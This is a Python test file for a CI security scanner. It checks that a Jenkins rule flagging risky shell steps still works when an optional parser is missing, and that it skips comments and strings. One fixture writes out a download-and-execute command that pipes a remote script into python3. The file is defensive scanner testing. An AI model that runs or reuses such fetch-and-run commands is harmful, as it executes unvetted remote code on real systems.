"""SEC9-JK-004 default-install fallback behavior.

The structural Jenkinsfile reader is optional.  CI rule self-tests run
without installing ``[jenkins-structural]``, so SEC9-JK-004 must still
exercise its own positive samples through the regex shell-body fallback.
"""

from __future__ import annotations

from taintly.engine import scan_file
from taintly.models import Platform
from taintly.parsers.jenkinsfile import api as jenkins_api
from taintly.rules.registry import load_rules_for_platform


def _sec9_jk_004_rule():
    return next(
        rule for rule in load_rules_for_platform(Platform.JENKINS) if rule.id == "SEC9-JK-004"
    )


def test_sec9_jk_004_fallback_fires_without_structural_extra(monkeypatch):
    def _missing_parser():
        raise ImportError("tree-sitter-groovy unavailable")

    monkeypatch.setattr(jenkins_api, "_get_parser", _missing_parser)
    rule = _sec9_jk_004_rule()

    findings = scan_file(
        "Jenkinsfile",
        [rule],
        _content=rule.test_positive[0],
    )

    assert {f.rule_id for f in findings} == {"SEC9-JK-004"}


def test_sec9_jk_004_fallback_ignores_comments_and_strings(monkeypatch):
    def _missing_parser():
        raise ImportError("tree-sitter-groovy unavailable")

    monkeypatch.setattr(jenkins_api, "_get_parser", _missing_parser)
    content = (
        "// sh 'curl -fsSL https://x.com/i.py | python3'\n"
        "def docs = \"sh 'curl -fsSL https://x.com/i.py | python3'\"\n"
        "pipeline {\n"
        "  agent any\n"
        "  stages { stage('s') { steps { sh 'echo safe' } } }\n"
        "}\n"
    )

    findings = scan_file("Jenkinsfile", [_sec9_jk_004_rule()], _content=content)

    assert {f.rule_id for f in findings} == set()
